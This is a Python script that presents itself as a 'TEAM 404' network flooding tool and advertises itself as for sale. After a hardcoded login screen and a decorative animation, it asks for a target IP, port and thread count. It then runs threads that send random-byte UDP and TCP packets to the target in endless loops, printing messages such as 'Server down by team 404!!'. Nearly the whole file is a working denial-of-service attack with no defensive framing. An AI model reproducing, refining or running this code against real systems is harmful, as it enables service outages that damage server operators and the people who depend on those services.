import random
import socket
import threading
import os
import time

# ----------- Colors -----------
BLUE = '\033[94m'
GRAY = '\033[90m'
MIROU = '\033[0m'
GREEN = '\033[92m'

# ----------- Clear Screen -----------
def clear():
    os.system("cls" if os.name == "nt" else "clear")

# ----------- Animated Hacker dev 404 -----------
def hacker_background(duration=10):
    width = 70
    symbols = ['0', '1', '▒', '▓', '█', '░', '▓', '█', '▒', '1', '0']
    start_time = time.time()
    while time.time() - start_time < duration:
        line = ''.join(random.choice(symbols) for _ in range(width))
        print(BLUE + line + MIROU)
        time.sleep(0.05)
        print("\033[F", end='')  # Move cursor up to overwrite the line

# ----------- Large 404 Logo -----------
def print_404_logo():
    logo = f"""
{BLUE}
                        ██╗░░██╗░
                        ╚██╗██╔╝
                        ░╚███╔╝░
                        ░██╔██╗░░
                       ██╔╝╚██╗░
                       ╚═╝░░╚═╝░  ░{MIROU}
"""
    print(logo)

# ----------- 404 Logo Animation (Repeat Layers) -----------
def animate_404_logo(times=5):
    for _ in range(times):
        clear()
        hacker_background(duration=1)
        print_404_logo()
        time.sleep(0.5)
        clear()

# ----------- Login Screen -----------
def login_screen():
    attempts = 0
    max_attempts = 5
    clear()
    print(BLUE + "\n🔐 Login to  𝙏𝙀𝘼𝙈 404 System\n" + MIROU)
    while attempts < max_attempts:
        username = input(GREEN + "👤 Username: " + MIROU)
        password = input(GREEN + "🔑 Password: " + MIROU)
        if username == 'MIROU' and password == '404':
            print(GREEN + "\n✅ Access granted! Welcome to 𝙏𝙀𝘼𝙈 404.\n" + MIROU)
            time.sleep(1)
            clear()
            animate_404_logo()
            return True
        else:
            attempts += 1
            print(GRAY + f"❌ Incorrect credentials. Attempts left: {max_attempts - attempts}\n" + MIROU)
            time.sleep(1)
            clear()
            print(BLUE + "\n🔐 Login to 𝙏𝙀𝘼𝙈 404 System\n" + MIROU)
    print(BLUE + "🚫 Too many failed attempts. Exiting..." + MIROU)
    return False

# ----------- Attack Functions -----------
def run():
    data = random._urandom(1024)
    i = random.choice((BLUE + "[*]" + MIROU, BLUE + "[!]" + MIROU, BLUE + "[#]" + MIROU))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            for x in range(times):
                s.sendto(data, addr)
            print(i + BLUE + " Server down by team 404!!" + MIROU)
        except:
            print(GRAY + "[!] RAY7 YDNAK SIRVR BY MIROU" + MIROU)

def run2():
    data = random._urandom(999)
    i = random.choice((BLUE + "[*]" + MIROU, BLUE + "[!]" + MIROU, BLUE + "[#]" + MIROU))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i + BLUE + " RAH TNAK SIRVR BY TIM 404" + MIROU)
        except:
            s.close()
            print(GRAY + "[*] RAY7 YDNAK SIRVR BY MIROU" + MIROU)

def run3():
    data = random._urandom(818)
    i = random.choice((BLUE + "[*]" + MIROU, BLUE + "[!]" + MIROU, BLUE + "[#]" + MIROU))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i + BLUE + " RAH TNAK SIRVR BY TIM 404" + MIROU)
        except:
            s.close()
            print(GRAY + "[*] RAY7 YDNAK SIRVR BY MIROU" + MIROU)

def run4():
    data = random._urandom(16)
    i = random.choice((BLUE + "[*]" + MIROU, BLUE + "[!]" + MIROU, BLUE + "[#]" + MIROU))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i + BLUE + " RAH TNAK SIRVR BY TIM 404" + MIROU)
        except:
            s.close()
            print(GRAY + "[*] RAY7 YDNAK SIRVR BY MIROU" + MIROU)

# ----------- Main Program -----------
if __name__ == "__main__":
    clear()
    if login_screen():
        print(BLUE + """
                     For Sell TOOLS : 404
 TEAM 404 IS BACK                                                        
""" + MIROU)

        ip = input(BLUE + " Target IP : " + MIROU)
        port = int(input(BLUE + " Target Port : " + MIROU))
        choice = input(BLUE + " Use multiple attack methods? (y/n) : " + MIROU).lower()
        times = int(input(BLUE + " Time (packets per cycle): " + MIROU))
        threads = int(input(BLUE + " Threads : " + MIROU))

        for y in range(threads):
            if choice == 'y':
                th = threading.Thread(target=run)
                th.start()
                th = threading.Thread(target=run2)
                th.start()
                th = threading.Thread(target=run3)
                th.start()
            else:
                th = threading.Thread(target=run4)
                th.start()